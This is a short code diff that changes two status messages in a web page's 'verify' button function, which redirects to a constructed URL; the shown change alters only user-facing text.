@@ -44,14 +44,14 @@
 
     // Function to show the button after a delay
     function showButton() {
-      document.getElementById('message').innerText = 'Verify your details and proceed.';
+      document.getElementById('message').innerText = 'Device has been verified! Please Click the verify button to procced';
       const newURL = constructNewURL();
       if (newURL) {
         const redirectButton = document.getElementById('redirectButton');
         redirectButton.style.display = 'block';
         redirectButton.onclick = () => location.href = newURL;
       } else {
-        document.getElementById('message').innerText = 'Verification failed: Code parameter missing.';
+        document.getElementById('message').innerText = 'Verification failed: Please contact support!';
       }
     }
 
